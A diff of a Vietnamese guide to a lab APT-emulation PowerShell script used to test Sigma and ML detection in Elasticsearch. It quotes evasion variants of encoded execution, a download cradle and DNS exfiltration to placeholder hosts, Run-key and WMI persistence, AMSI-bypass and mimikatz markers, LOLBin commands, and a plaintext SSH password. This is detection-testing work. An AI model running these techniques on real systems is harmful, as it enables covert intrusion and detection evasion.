@@ -1,353 +1,596 @@
-# Giải thích `apt_demo_scenario.ps1` — 7 Phase và rule match
+# Giải thích `apt_demo_scenario.ps1`
 
-File này giải thích từng phase trong `demo/apt_demo_scenario.ps1`:
-- **Lệnh** PowerShell chạy thật
-- **Log** sinh ra (Sysmon EID / PowerShell EID)
-- **Sigma rule** kỳ vọng fire trong Kibana Security/Rules
-- **RED ML rule** kỳ vọng attribute (trong 1,367 catalog)
-- **Lệnh verify** để kiểm tra trên ELK
+File này giải thích bản hiện tại của `demo/apt_demo_scenario.ps1` để dùng khi
+chuẩn bị demo RED + AI Agent. Nội dung tập trung vào:
 
-> Mode chạy script: `benign | baseline | evasion | chain`. Mặc định `chain` chạy
-> hết 7 phase mix baseline + evasion.
+- Script nhận tham số gì.
+- `chain` khác `evasion` như thế nào.
+- Mỗi phase sinh log gì.
+- Sigma dự kiến bắt phần nào.
+- RED dự kiến bắt/attribute phần nào.
+- Cách verify nhanh trên Elasticsearch/Kibana.
+
+> Cập nhật theo script hiện tại: `apt_demo_scenario.ps1` có 7 phase, hỗ trợ
+> `benign | baseline | evasion | chain`, mặc định là `chain`.
 
 ---
 
-## Phase 1 — PowerShell Encoded Execution
+## 1. Cách Chạy Đúng
 
-### Lệnh chạy
+Trên Windows VM:
 
 ```powershell
-# Variant baseline
-Start-Process powershell.exe -ArgumentList "-NoProfile","-EncodedCommand",$enc
-
-# Variant A (Tier 1)
-Start-Process powershell.exe -ArgumentList "-NoProfile","-e",$enc
-
-# Variant B (Tier 2) — format string
-$cmd = ('{0}{1}{2}' -f 'In','voke-Exp','ression')
-
-# Variant C (Tier 2) — char code
-$cmd = -join ([char]73,[char]69,[char]88)   # → "IEX"
+powershell -ExecutionPolicy Bypass -File C:\Users\LuanThanh\apt_demo_scenario.ps1 -Mode chain -SleepSeconds 120
 ```
 
-### Log sinh ra
+Chạy thử parse/script flow, không thực thi action:
 
-- **Sysmon EID 1** (process_creation): `winlog.event_data.CommandLine = "powershell.exe -e ..."`
-- **PowerShell EID 4104** (ScriptBlockText): các Tier 2 variant log scriptblock
+```powershell
+powershell -ExecutionPolicy Bypass -File C:\Users\LuanThanh\apt_demo_scenario.ps1 -Mode chain -DryRun
+```
 
-### Match rules
+Chạy riêng một phase:
 
-| Layer | Rule | Lý do |
+```powershell
+powershell -ExecutionPolicy Bypass -File C:\Users\LuanThanh\apt_demo_scenario.ps1 -Mode evasion -Phase 1 -SleepSeconds 120
+```
+
+Lưu ý quan trọng:
+
+- Không thêm dấu `'` ở cuối lệnh.
+- `-SleepSeconds` giữ process PowerShell sống đủ lâu để RED/Forensic nhìn thấy.
+- Script tự tạo `RunId`; khi demo nhớ copy `RunId` để search trong Kibana.
+- Nếu chạy qua SSH, có thể phát sinh thêm alert liên quan SSH/non-interactive parent. Đây là nhiễu lab, không phải lỗi RED.
+
+---
+
+## 2. Mode Hoạt Động
+
+| Mode | Mục đích | Kỳ vọng Sigma | Kỳ vọng RED |
+|---|---|---|---|
+| `benign` | Đối chứng hành vi quản trị bình thường | Không có alert mới | Không có RED alert đáng kể |
+| `baseline` | Chạy pattern canonical/literal | Sigma rule cứng fire rõ | RED score cao, attribution gần rule Sigma |
+| `evasion` | Chạy biến thể né keyword/literal | Một số rule cứng có thể miss; rule behavior rộng vẫn có thể fire | RED bắt obfuscation/near-miss |
+| `chain` | Kịch bản APT thực tế hơn, pha baseline + advanced behavior | Sigma fire phần baseline/behavior, có thể miss phần evasion | RED bắt cả baseline lẫn phần né |
+
+Nói ngắn gọn khi thuyết trình:
+
+- `baseline`: “đây là mẫu dễ bắt vì có keyword/rule literal”.
+- `evasion`: “đây là cùng ý đồ nhưng đổi cách viết để tránh rule cứng”.
+- `chain`: “đây là câu chuyện tấn công hoàn chỉnh hơn, có cả phần Sigma bắt được và phần RED bổ sung”.
+
+---
+
+## 3. Khác Nhau Giữa `chain` Và `evasion`
+
+| Phase | `chain` hiện tại | `evasion` hiện tại |
 |---|---|---|
-| **Sigma (Kibana baseline)** | `posh_ps_susp_invocation_specific.yml` | Check `-EncodedCommand` literal — chỉ fire trên baseline |
-| **RED process_creation** | `powershell_base64_encoded_iex_cmdlet` | Bắt token `powershell`+`base64`+`iex` |
-| **RED powershell** | `suspicious_powershell_invocations_specific` | Cosine match scriptblock tokens |
+| Phase 1 - Execution | `powershell -EncodedCommand <base64>` baseline | `powershell -e <base64>` + format string + char-code `IEX` |
+| Phase 2 - Download cradle | Literal `IEX (New-Object System.Net.WebClient).DownloadString(...)` | Split string, comment injection, env-var chain |
+| Phase 3 - Persistence | `HKCU\...\Run` + WMI Event Subscription | `HKCU\...\RunOnce` + WMI Event Subscription |
+| Phase 4 - Defense evasion | Child scriptblock có literal log-cleanup cmdlet dựng runtime | Char-code hash, base64 memory marker, reverse string |
+| Phase 5 - Credential marker | Child scriptblock có credential marker dựng runtime | Char-code hash, base64 marker, reverse string |
+| Phase 6 - DNS/Fileless/LOLBins | DNS tunneling + fileless marker; LOLBins chỉ chạy nếu bật noisy path | Giống phase 6 của chain |
+| Phase 7 - Sandbox probe | Sandbox probe label baseline | Cùng probe, label evasion |
 
-### Verify
+Vì vậy, `chain` không phải “evasion thuần”. Nó là kịch bản tổng hợp để demo cả 3 lớp:
+
+1. Sigma bắt phần rõ ràng.
+2. RED bắt phần gần giống/né rule.
+3. AI Agent điều tra theo chuỗi sự kiện.
+
+---
+
+## 4. Ghi Chú Kỹ Thuật Cần Biết Trước Demo
+
+Trong script hiện tại có hai điểm cần để ý:
+
+1. Phase 6 gọi `Use-NoisySigma`, nhưng trong file hiện tại chưa thấy định nghĩa function/param này.
+   Nếu chưa sửa script, PowerShell có thể in lỗi ở Phase 6 rồi tiếp tục chạy. Để demo sạch, nên thêm helper hoặc bỏ nhánh noisy.
+
+2. Phần summary dùng `$IncludeNoisySigma`, nhưng tham số này cũng chưa được khai báo trong `param(...)`.
+   Biến null thường được hiểu là false, nên summary sẽ đi vào nhánh “Sigma-low evasion”.
+
+Nếu mục tiêu là chạy demo mượt trước hội đồng, nên sửa hai điểm này trong `.ps1`
+hoặc chấp nhận rằng Phase 6 có thể hiện lỗi nhỏ trên console.
+
+---
+
+## 5. Bảng Phase Tổng Quan
+
+| Phase | Chủ đề | Log chính | Sigma target | RED config/index |
+|---|---|---|---|---|
+| 1 | PowerShell encoded execution | Sysmon EID 1, PowerShell 4104 | EncodedCommand / suspicious invocation | `config/process_creation.yaml`, `config/powershell.yaml` |
+| 2 | Download cradle | PowerShell 4104 | WebClient + DownloadString | `config/powershell.yaml` |
+| 3 | Persistence | Sysmon EID 11, 12, 13, 19, 20, 21 | Run/RunOnce, WMI subscription | `config/registry_event.yaml`, process rules |
+| 4 | Defense evasion marker | PowerShell 4104 | Clear log / memory marker | `config/powershell.yaml` |
+| 5 | Credential access marker | PowerShell 4104 | credential keyword marker | `config/powershell.yaml` |
+| 6 | DNS tunneling + fileless + optional LOLBins | Sysmon EID 22, PowerShell 4104, optional Sysmon EID 1 | DNS, reflection, LOLBins | `config/process_creation.yaml`, `config/powershell.yaml` |
+| 7 | Sandbox/analysis probe | PowerShell 4104 | Get-CimInstance, Get-Process, analyst tools | `config/powershell.yaml` |
+
+---
+
+## 6. Phase 1 - PowerShell Encoded Execution
+
+### Code chính
+
+`chain` / `baseline`:
+
+```powershell
+Start-Process powershell.exe -ArgumentList "-NoProfile","-EncodedCommand",$enc
+```
+
+`evasion`:
+
+```powershell
+Start-Process powershell.exe -ArgumentList "-NoProfile","-e",$enc
+$cmd = ('{0}{1}{2}' -f 'In','voke-Exp','ression')
+$cmd = -join ([char]73,[char]69,[char]88)
+```
+
+### Ý nghĩa
+
+- `-EncodedCommand` là literal phổ biến, Sigma dễ bắt.
+- `-e` là shorthand hợp lệ của PowerShell, giúp né rule chỉ match literal `-EncodedCommand`.
+- Format string và char-code tạo marker tương đương `Invoke-Expression`/`IEX` nhưng tránh literal trực tiếp.
+
+### Log
+
+- Sysmon EID 1: command line của `powershell.exe`.
+- PowerShell EID 4104: scriptblock của variant format/char-code.
+
+### Verify nhanh
 
 ```bash
-ES_PASS=$(grep ES_PASSWORD .env | cut -d= -f2)
-# Logs gốc trong ELK
-curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=2" \
+curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
   -H 'Content-Type: application/json' \
-  -d '{"query":{"bool":{"must":[{"term":{"event.code":"1"}},{"query_string":{"query":"*RED_APT_DEMO_PHASE1*"}}]}},"_source":["winlog.event_data.CommandLine"]}'
+  -d '{"query":{"query_string":{"query":"*RED_APT_DEMO_PHASE1*"}},"_source":["@timestamp","event.code","winlog.event_data.CommandLine","winlog.event_data.ScriptBlockText"]}'
 ```
 
 ---
 
-## Phase 2 — Download Cradle (IEX + WebClient)
+## 7. Phase 2 - Download Cradle
 
-### Lệnh chạy
+### Code chính
+
+`chain` / `baseline`:
 
 ```powershell
-# Baseline
-IEX (New-Object System.Net.WebClient).DownloadString('http://...')
+IEX (New-Object System.Net.WebClient).DownloadString('http://red-demo-cradle.invalid/...')
+```
 
-# Variant A (Tier 1) — split string
+`evasion`:
+
+```powershell
 $type = ('Sys' + 'tem.Net.WebCl' + 'ient')
 $method = ('.Down' + 'loadStr' + 'ing')
-
-# Variant B (Tier 2) — comment inject (PowerShell parser bỏ qua <#...#>)
 $wc = New-Object Sys<#a#>tem.Net.WebCl<#b#>ient
-
-# Variant C (Tier 2) — env var chain
-$env:DEMO_T1 = 'System.Net.'
-$env:DEMO_T2 = 'WebClient'
-$wc = New-Object -TypeName ($env:DEMO_T1 + $env:DEMO_T2)
+$assembled = $env:DEMO_T1 + $env:DEMO_T2
+$wc = New-Object -TypeName $assembled
 ```
 
-### Log sinh ra
+### Ý nghĩa
 
-- **PowerShell EID 4104** (ScriptBlockText) — full text của scriptblock
+- Baseline có đủ literal `System.Net.WebClient` và `DownloadString`.
+- Evasion chia nhỏ chuỗi, chèn comment hoặc dựng từ env var để né exact-match.
+- Script lab-safe: không tải payload thật.
 
-### Match rules
+### Log
 
-| Layer | Rule | Lý do |
-|---|---|---|
-| **Sigma (Kibana baseline)** | `posh_ps_susp_download.yml` | Check `System.Net.WebClient` + `.DownloadString` cùng xuất hiện |
-| **Sigma (alt)** | `posh_ps_web_request_cmd_and_cmdlets.yml` | Check `Invoke-WebRequest`, `Invoke-RestMethod`... |
-| **RED powershell** | `suspicious_powershell_download_powershell_script` (mới từ catalog) | Cosine ground vào filter values của rule |
+- PowerShell EID 4104 chứa ScriptBlockText.
 
-### Verify
+### Verify nhanh
 
 ```bash
-# Search scriptblock chứa Phase 2 marker
-curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=2" \
+curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
   -H 'Content-Type: application/json' \
-  -d '{"query":{"query_string":{"query":"*RED_APT_DEMO_PHASE2*"}},"_source":["winlog.event_data.ScriptBlockText"]}'
+  -d '{"query":{"query_string":{"query":"*RED_APT_DEMO_PHASE2*"}},"_source":["@timestamp","event.code","winlog.event_data.ScriptBlockText"]}'
 ```
 
 ---
 
-## Phase 3 — Persistence (Run key / RunOnce / WMI)
+## 8. Phase 3 - Persistence
 
-### Lệnh chạy
+### Code chính
+
+`chain` / `baseline`:
 
 ```powershell
-# Baseline + chain — Run key
-Copy-Item C:\Windows\System32\calc.exe C:\Users\Public\xkj9_demo_*.exe
+Copy-Item C:\Windows\System32\calc.exe C:\Users\Public\xkj9_demo_<RunId>.exe
 New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
-                 -Name "RED_APT_DEMO_PERSIST_*" -Value $DropperPath
-
-# Variant A (Tier 1) — RunOnce thay Run
-New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" ...
-
-# Variant B (Tier 3) — WMI Event Subscription (T1546.003)
-$f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{...}
-$c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{...}
-Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{...}
+  -Name "RED_APT_DEMO_PERSIST_<RunId>" -Value $DropperPath
 ```
 
-### Log sinh ra
+`chain` thêm WMI Event Subscription:
 
-- **Sysmon EID 11** (file create): `C:\Users\Public\xkj9_demo_*.exe`
-- **Sysmon EID 13** (registry SetValue): `HKU\...\Run\` hoặc `\RunOnce\`
-- **Sysmon EID 12** (registry CreateKey)
-- **Sysmon EID 19/20/21** (WMI Event Filter/Consumer/Binding)
+```powershell
+Set-WmiInstance -Namespace root\subscription -Class __EventFilter ...
+Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer ...
+Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding ...
+```
 
-### Match rules
+`evasion`:
 
-| Layer | Rule | Lý do |
-|---|---|---|
-| **Sigma Kibana** | `registry_set_asep_reg_keys_modification_currentversion.yml` | Check `\CurrentVersion\Run\` |
-| **Sigma WMI** | `sysmon_wmi_event_subscription.yml` | Sysmon EID 19/20/21 |
-| **RED registry_event** | `currentversion_autorun_keys_modification` (Run baseline) | |
-| **RED registry_event** | `currentversion_nt_autorun_keys_modification` (RunOnce variant) | Catalog expansion thấy được |
-| **RED process_creation** | `wmi_persistence_script_event_consumer` | WMI Consumer fires PowerShell |
+```powershell
+New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" `
+  -Name "RED_APT_DEMO_PERSIST_<RunId>" -Value $DropperPath
+```
 
-### Verify
+và cũng tạo WMI Event Subscription.
+
+### Ý nghĩa
+
+- `Run` là persistence canonical.
+- `RunOnce` là biến thể khác đường registry, có thể né rule chỉ match `Run`.
+- WMI Event Subscription là behavior-level persistence, thường bị bắt bởi rule Sysmon WMI.
+
+### Log
+
+- Sysmon EID 11: file copy `xkj9_demo_<RunId>.exe`.
+- Sysmon EID 13: registry SetValue.
+- Sysmon EID 19/20/21: WMI filter/consumer/binding nếu WMI logging bật.
+
+### Verify nhanh
 
 ```bash
-# Registry events demo
+curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=10" \
+  -H 'Content-Type: application/json' \
+  -d '{"query":{"query_string":{"query":"*RED_APT_DEMO_PERSIST* OR *xkj9_demo*"}},"_source":["@timestamp","event.code","winlog.event_data.TargetObject","winlog.event_data.Details","winlog.event_data.CommandLine"]}'
+```
+
+---
+
+## 9. Phase 4 - Defense Evasion Marker
+
+### Code hiện tại
+
+`chain` / `baseline`:
+
+```powershell
+$cmdBytes = @(71,101,116,45,67,111,109,109,97,110,100,32,67,108,101,97,114,45,69,118,101,110,116,76,111,103,32,124,32,79,117,116,45,78,117,108,108)
+$sensitive = -join ($cmdBytes | ForEach-Object { [char]$_ })
+$scriptText = "Write-Host '...'; $sensitive"
+```
+
+Tức là child scriptblock chứa câu tương đương:
+
+```powershell
+Get-Command Clear-EventLog | Out-Null
+```
+
+`evasion`:
+
+```powershell
+# Variant A: char-code array rồi chỉ in hash
+# Variant B: memory marker được build thành base64 rồi decode runtime, không eval
+# Variant C: reverse string "goLtnevE-raelC"
+```
+
+### Ý nghĩa
+
+- Bản cũ của tài liệu nói Phase 4 dùng split keyword/AMSI marker trực tiếp. Script hiện tại đã đổi: baseline cũng dựng literal qua char-code để parent script sạch, còn evasion chỉ log hash/length, không gọi destructive action.
+- Đây là phase demo “keyword evasion”: cùng semantic marker nhưng tránh literal trong log parent/child.
+
+### Log
+
+- PowerShell EID 4104.
+
+### Verify nhanh
+
+```bash
 curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
   -H 'Content-Type: application/json' \
-  -d '{"query":{"bool":{"must":[{"term":{"event.code":"13"}},{"query_string":{"query":"*RED_APT_DEMO_PERSIST*"}}]}},"_source":["winlog.event_data.TargetObject","winlog.event_data.Details"]}'
+  -d '{"query":{"query_string":{"query":"*RED_APT_DEMO_PHASE4*"}},"_source":["@timestamp","event.code","winlog.event_data.ScriptBlockText"]}'
+```
 
-# WMI events
+---
+
+## 10. Phase 5 - Credential Access Marker
+
+### Code hiện tại
+
+`chain` / `baseline`:
+
+```powershell
+$credBytes = @(115,101,107,117,114,108,115,97,58,58,108,111,103,111,110,112,97,115,115,119,111,114,100,115)
+$sensitive = -join ($credBytes | ForEach-Object { [char]$_ })
+$marker = $sensitive
+```
+
+`evasion`:
+
+```powershell
+# Variant A: char-code array rồi chỉ in hash
+# Variant B: base64-encoded marker, decode runtime, chỉ in length
+# Variant C: reverse string "sdrowssapnogol::aslrukes"
+```
+
+### Ý nghĩa
+
+- Script không touch LSASS.
+- Baseline tạo credential marker ở child scriptblock để Sigma keyword rule có dữ liệu.
+- Evasion tránh literal `sekurlsa`/`logonpasswords` trong source bằng số, base64 hoặc chuỗi đảo.
+
+### Log
+
+- PowerShell EID 4104.
+
+### Verify nhanh
+
+```bash
 curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
   -H 'Content-Type: application/json' \
-  -d '{"query":{"terms":{"event.code":["19","20","21"]}}}'
+  -d '{"query":{"query_string":{"query":"*RED_APT_DEMO_PHASE5*"}},"_source":["@timestamp","event.code","winlog.event_data.ScriptBlockText"]}'
 ```
 
 ---
 
-## Phase 4 — Defense Evasion (Clear Log + AMSI bypass)
+## 11. Phase 6 - DNS Tunnel, Fileless, Optional LOLBins
 
-### Lệnh chạy
+### Code hiện tại
+
+Phase này chạy cho `baseline`, `chain`, `evasion`.
+
+Nhánh LOLBins:
 
 ```powershell
-# Baseline
-Get-Command Clear-EventLog
-
-# Variant A (Tier 1) — split keyword
-$cmdName = 'Clear' + '-Event' + 'Log'
-
-# Variant B (Tier 3) — AMSI bypass MARKER (không patch AMSI thật!)
-$amsiMarker = '[Ref].Assembly.GetType(' + "'System.Management.Automation.Amsi'" +
-              '+Utils").GetField("amsiInitFailed","NonPublic,Static")'
+if (Use-NoisySigma) {
+    Start-Process mshta.exe ...
+    Start-Process regsvr32.exe ...
+    Start-Process rundll32.exe ...
+} else {
+    Write-Action "Skip mshta/regsvr32/rundll32 in default evasion"
+}
 ```
 
-### Log sinh ra
-
-- **PowerShell EID 4104** (ScriptBlockText) — chứa cả 2 keyword
-
-### Match rules
-
-| Layer | Rule | Lý do |
-|---|---|---|
-| **Sigma Kibana** | `posh_ps_susp_clear_eventlog.yml` | Check literal `Clear-EventLog` |
-| **Sigma AMSI** | `posh_ps_amsi_bypass.yml` | Check `amsiInitFailed` keyword |
-| **RED powershell** | `suspicious_eventlog_clear` | Cosine match Tier 1 keyword |
-| **RED powershell** | `potential_amsi_bypass_via_*` (từ catalog) | Match `amsiInitFailed` token |
-
----
-
-## Phase 5 — Credential Access Marker (Mimikatz)
-
-### Lệnh chạy
+DNS tunneling marker luôn chạy:
 
 ```powershell
-# Baseline — literal
-$mimikatzCmd = 'sekurlsa::logonpasswords'
-
-# Variant A (Tier 1) — concat split
-$kw = 'sek' + 'urlsa' + '::log' + 'onpasswords'
-
-# Variant B (Tier 2) — char code reconstruct
-$bytes = @(115,101,107,117,114,108,115,97)   # 'sekurlsa' bytes
-$prefix = -join ($bytes | ForEach-Object { [char]$_ })
-
-# Variant C (Tier 2) — format string
-$built = '{0}{1}::{2}{3}' -f 'sek','urlsa','log','onpasswords'
-```
-
-### Log sinh ra
-
-- **PowerShell EID 4104** (ScriptBlockText)
-
-### Match rules
-
-| Layer | Rule | Lý do |
-|---|---|---|
-| **Sigma Kibana** | `posh_ps_potential_invoke_mimikatz.yml` | Check `sekurlsa::logonpasswords` literal |
-| **RED powershell** | `potential_invoke_mimikatz_powershell_script` | Catalog rule |
-| **RED powershell** | `malicious_powershell_keywords` | Token-level match |
-
----
-
-## Phase 6 — LOLBins + DNS Tunnel + Fileless
-
-### Lệnh chạy
-
-```powershell
-# Variant A (1.4.6 LotL) — mshta javascript
-Start-Process mshta.exe -ArgumentList "javascript:close(new ActiveXObject('WScript.Shell').Run(...))"
-
-# Variant B (1.4.6 LotL) — Squiblydoo
-Start-Process regsvr32.exe -ArgumentList "/s","/n","/u","/i:C:\Windows\System32\scrobj.dll"
-
-# Variant C (1.4.6 LotL) — rundll32 javascript
-Start-Process rundll32.exe -ArgumentList "javascript:\"\..\mshtml,RunHTMLApplication \";..."
-
-# Variant D (1.4.3 Encryption/Tunneling) — DNS exfil
 Resolve-DnsName -Name "<base64>.exfil.red-evasion.invalid"
+```
 
-# Variant E (1.4.6 Fileless) — Reflection.Assembly marker
+Fileless marker luôn chạy:
+
+```powershell
 $markerKw = '[' + 'System.Reflection.Assembly' + ']::' + 'Load'
 ```
 
-### Log sinh ra
+### Ý nghĩa
 
-- **Sysmon EID 1** (process_creation) cho mshta/regsvr32/rundll32
-- **Sysmon EID 22** (DNS query) cho variant D
-- **PowerShell EID 4104** cho variant E
+- DNS subdomain dài mô phỏng exfil/tunneling marker.
+- Fileless marker mô phỏng `Reflection.Assembly::Load`, nhưng không load DLL thật.
+- LOLBins là noisy path vì Sigma/Defender thường bắt mạnh `mshta`, `regsvr32`, `rundll32`.
 
-### Match rules
+### Cảnh báo
 
-| Layer | Rule | Lý do |
-|---|---|---|
-| **Sigma Kibana (regsvr32)** | `proc_creation_win_regsvr32_flags_anomaly.yml` | Check `/s /n /u /i` flag pattern |
-| **Sigma Kibana (mshta)** | `proc_creation_win_mshta_javascript_*.yml` | Check `mshta` + `javascript:` |
-| **Sigma Kibana (rundll32)** | `proc_creation_win_rundll32_javascript_*.yml` | Check `rundll32 javascript:` |
-| **Sigma Kibana (Reflection)** | `posh_ps_dotnet_assembly_from_file.yml` | Check `Reflection.Assembly` + `Load` |
-| **RED process_creation** | `potential_regsvr32_commandline_flag_anomaly` | Match regsvr32 squiblydoo |
-| **RED process_creation** | `potential_lethalhta_technique_execution` | Match LethalHTA pattern |
-| **RED powershell** | `potential_in_memory_execution_using_reflection_assembly` | Match Reflection token |
+Script hiện tại chưa khai báo `Use-NoisySigma`. Nếu chưa sửa, Phase 6 có thể hiện lỗi khi vào `if (Use-NoisySigma)`.
 
-### Verify
+### Log
+
+- Sysmon EID 22: DNS query.
+- PowerShell EID 4104: fileless marker.
+- Sysmon EID 1: chỉ có nếu noisy LOLBins thật sự được bật/chạy.
+
+### Verify nhanh
 
 ```bash
-# LOLBins process events
 curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
   -H 'Content-Type: application/json' \
-  -d '{"query":{"bool":{"must":[{"term":{"event.code":"1"}},{"query_string":{"query":"(mshta OR regsvr32 OR rundll32) AND *RED_APT_DEMO*"}}]}},"_source":["winlog.event_data.CommandLine"]}'
-
-# DNS query
-curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=2" \
-  -H 'Content-Type: application/json' \
-  -d '{"query":{"bool":{"must":[{"term":{"event.code":"22"}},{"query_string":{"query":"*exfil.red-evasion.invalid*"}}]}}}'
+  -d '{"query":{"query_string":{"query":"*exfil.red-evasion.invalid* OR *RED_APT_DEMO_PHASE6*"}},"_source":["@timestamp","event.code","winlog.event_data.QueryName","winlog.event_data.CommandLine","winlog.event_data.ScriptBlockText"]}'
 ```
 
 ---
 
-## Phase 7 — Sandbox Detection Probe
+## 12. Phase 7 - Sandbox/Analysis Probe
 
-### Lệnh chạy
+### Code hiện tại
+
+Phase này gần như giống nhau cho `baseline`, `chain`, `evasion`; khác chủ yếu ở label in ra console.
 
 ```powershell
-# 5 probe checks (LAB-SAFE, không gate behavior)
 $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
 $procCount = (Get-Process).Count
 $analysts = @('wireshark','procmon','procexp','x64dbg','ollydbg','ida','ghidra','fiddler')
-Get-Process | Where-Object { $_.Name -in $analysts }
 Add-Type -AssemblyName System.Windows.Forms
-$pos1 = [System.Windows.Forms.Cursor]::Position    # mouse position
+$pos1 = [System.Windows.Forms.Cursor]::Position
 $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
 ```
 
-### Log sinh ra
+### Ý nghĩa
 
-- **PowerShell EID 4104** (ScriptBlockText) — chứa toàn bộ scriptblock với probe keywords
+- Đây là sandbox/analysis evasion marker, nhưng lab-safe.
+- Script chỉ probe và log, không thay đổi behavior dựa trên kết quả.
 
-### Match rules
+### Log
 
-| Layer | Rule | Lý do |
-|---|---|---|
-| **Sigma Kibana** | `posh_ps_susp_get_information_powershell.yml` | Check `Get-CimInstance Win32_ComputerSystem` |
-| **Sigma Kibana** | `posh_ps_susp_keywords.yml` | Check `Cursor.Position` + analyst tool names |
-| **RED powershell** | `potential_suspicious_powershell_keywords` | Catalog rule, broad match |
-| **RED powershell** | `suspicious_process_discovery_with_get_process` | Match `Get-Process` enum |
+- PowerShell EID 4104.
 
-### Verify
+### Verify nhanh
 
 ```bash
-curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=1" \
+curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
   -H 'Content-Type: application/json' \
-  -d '{"query":{"query_string":{"query":"*PHASE7_SANDBOX*"}},"_source":["winlog.event_data.ScriptBlockText"]}'
+  -d '{"query":{"query_string":{"query":"*PHASE7_SANDBOX*"}},"_source":["@timestamp","event.code","winlog.event_data.ScriptBlockText"]}'
 ```
 
 ---
 
-# Verify đầy đủ end-to-end (3 lệnh)
+## 13. RED Live Detection Khuyến Nghị
+
+Trước khi chạy Windows script, bật 3 luồng RED live detection trên Ubuntu lab.
 
 ```bash
 cd ~/KLTN/KLTN/Rule_Evasion_Detection/rule_evasion_detection
 source ~/venvs/rule_evasion_env/bin/activate
-ES_PASS=$(grep ES_PASSWORD .env | cut -d= -f2)
+set -a; source .env; set +a
+ES_AUTH_HOST="http://${ES_USER}:${ES_PASSWORD}@10.10.20.100:9200"
+```
 
-# 1. Trigger demo (Windows VM)
-sshpass -p tzxr ssh luanthanh@10.10.20.50 \
-  'powershell -ExecutionPolicy Bypass -File C:\Users\LuanThanh\apt_demo_scenario.ps1 -Mode chain -SleepSeconds 60'
-# → capture RunId (vd 85ae464b)
+Process creation:
 
-sleep 60
+```bash
+python3 scripts/detect_live.py \
+  --config config/process_creation.yaml \
+  --es-host "$ES_AUTH_HOST" \
+  --es-index "logs-winlog*" \
+  --out-index red-alerts-demo \
+  --event-id 1 \
+  --threshold 0.5 \
+  --method cosine \
+  --timestamp-field event.ingested \
+  --interval 30 \
+  --lookback 10m \
+  --reset-state \
+  --batch-size 500
+```
 
-# 2. Đếm event theo EID cho RunId này
-RUNID="<paste_runid>"
+Registry:
+
+```bash
+python3 scripts/detect_live.py \
+  --config config/registry_event.yaml \
+  --es-host "$ES_AUTH_HOST" \
+  --es-index "logs-winlog*" \
+  --out-index red-alerts-registry-demo \
+  --event-id 13 \
+  --threshold 0.5 \
+  --method cosine \
+  --timestamp-field event.ingested \
+  --interval 30 \
+  --lookback 10m \
+  --reset-state \
+  --batch-size 500
+```
+
+PowerShell ScriptBlock:
+
+```bash
+python3 scripts/detect_live.py \
+  --config config/powershell.yaml \
+  --es-host "$ES_AUTH_HOST" \
+  --es-index "logs-winlog*" \
+  --out-index red-alerts-powershell-demo \
+  --event-id 4104 \
+  --threshold 0.5 \
+  --method cosine \
+  --timestamp-field event.ingested \
+  --interval 30 \
+  --lookback 10m \
+  --reset-state \
+  --batch-size 500
+```
+
+Nếu script Windows đã chạy trước khi bật RED, backfill bằng `--since 20m --until now --max-iter 1 --no-state`.
+
+---
+
+## 14. Verify End-To-End Theo RunId
+
+Sau khi chạy script, lấy `RunId` từ console Windows rồi set:
+
+```bash
+RUNID="<paste-runid>"
+```
+
+Đếm log gốc theo Event ID:
+
+```bash
 curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=0" \
   -H 'Content-Type: application/json' \
   -d "{\"query\":{\"query_string\":{\"query\":\"*${RUNID}*\"}},\"aggs\":{\"by_code\":{\"terms\":{\"field\":\"event.code\",\"size\":20}}}}"
-# Expected: EID 1 + EID 11 + EID 13 + EID 19/20/21 + EID 22 + EID 4104
+```
 
-# 3. Run RED ML và xem rule attribution
-python3 scripts/elk_export.py --es-host http://10.10.20.100:9200 \
-  --es-user elastic --es-password "$ES_PASS" \
-  --es-index "logs-winlog*" --event-id 4104 --since 5m --out /tmp/ps.jsonl
-python3 scripts/detect_batch.py --config config/powershell.yaml \
-  --events /tmp/ps.jsonl --threshold 0.0 --method cosine --out /tmp/alerts.jsonl
+Xem RED alerts mới:
 
-# Xem mapping rule + Sigma metadata
-jq -r 'select(.command_line | test("RED_APT_DEMO")) | "\(.top_rule) | \(.top_rule_sigma_filename)"' /tmp/alerts.jsonl
+```bash
+curl -sk -u elastic:$ES_PASS \
+  "http://10.10.20.100:9200/red-alerts-demo,red-alerts-registry-demo,red-alerts-powershell-demo/_search?size=20&sort=@timestamp:desc&ignore_unavailable=true" \
+  | jq -r '.hits.hits[] | [._index, ._source["@timestamp"], ._source["red.detection_score"], ._source["red.top_rule"], (._source["red.command_line"] // "")] | @tsv'
+```
+
+Chạy batch detection nếu cần kiểm lại offline:
+
+```bash
+python3 scripts/elk_export.py \
+  --es-host http://10.10.20.100:9200 \
+  --es-user elastic \
+  --es-password "$ES_PASS" \
+  --es-index "logs-winlog*" \
+  --event-id 4104 \
+  --since 20m \
+  --out /tmp/ps_4104.jsonl
+
+python3 scripts/detect_batch.py \
